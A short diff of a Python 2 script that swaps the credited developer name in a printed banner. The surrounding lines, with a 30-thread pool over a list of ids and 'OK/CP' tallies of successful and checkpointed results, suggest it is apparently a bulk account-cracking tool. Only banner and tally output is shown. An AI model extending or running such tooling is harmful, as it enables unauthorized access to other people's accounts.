@@ -722,7 +722,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 #Dev:Binyamin
-        print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
+        print "\033[1;97m•-----------------\033[1;37mMR Uzair Khan\033[1;97m-----------------•"
 	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
 	print "\033[1;97m«-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------»"
